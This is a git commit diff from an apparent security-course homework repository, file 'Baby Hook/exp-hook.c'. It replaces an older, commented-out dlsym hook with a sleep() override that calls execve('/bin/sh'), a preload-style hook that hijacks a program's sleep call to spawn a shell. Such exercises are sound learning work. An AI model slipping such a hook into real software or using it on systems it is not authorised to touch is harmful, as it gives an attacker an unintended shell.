85a5a19156f6c79dcc4e455184cddf54dc25e238
sbk6401 <48666130+bernie6401@users.noreply.github.com>
2026-02-28 21:31:12 +0800

    Comment out original code and implement sleep hook

--- HW0/Baby Hook/share/exp-hook.c
+++ HW0/Baby Hook/share/exp-hook.c
@@ -1,20 +1,27 @@
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdint.h>
-#include <dlfcn.h>
+// #define _GNU_SOURCE
+// #include <stdio.h>
+// #include <stdint.h>
+// #include <dlfcn.h>
 
-#define unlikely(x) __builtin_expect(!!(x), 0)
-#define TRY_LOAD_HOOK_FUNC(name) if (unlikely(!g_sys_##name)) {g_sys_##name = (sys_##name##_t)dlsym(RTLD_NEXT,#name);}
+// #define unlikely(x) __builtin_expect(!!(x), 0)
+// #define TRY_LOAD_HOOK_FUNC(name) if (unlikely(!g_sys_##name)) {g_sys_##name = (sys_##name##_t)dlsym(RTLD_NEXT,#name);}
 
 
-typedef void* (*sys_sleep_t)(size_t size);
-static sys_sleep_t g_sys_sleep = NULL;
-void* sleep(size_t size)
-{
+// typedef void* (*sys_sleep_t)(size_t size);
+// static sys_sleep_t g_sys_sleep = NULL;
+// void* sleep(size_t size)
+// {
+//     execve("/bin/sh", (char *[]){0}, (char *[]){0});
+//     // TRY_LOAD_HOOK_FUNC(sleep);
+//     // void *p = g_sys_sleep(size);
+//     // printf("in malloc hook function ...\n");
+//     // execve("/bin/sh", (char *[]){0}, (char *[]){0});
+//     return 0;
+// }
+
+// hook_sleep.c
+
+unsigned int sleep(unsigned int seconds) {
     execve("/bin/sh", (char *[]){0}, (char *[]){0});
-    // TRY_LOAD_HOOK_FUNC(sleep);
-    // void *p = g_sys_sleep(size);
-    // printf("in malloc hook function ...\n");
-    // execve("/bin/sh", (char *[]){0}, (char *[]){0});
-    return p;
+    return 0; // hook sleep，立刻返回
 }
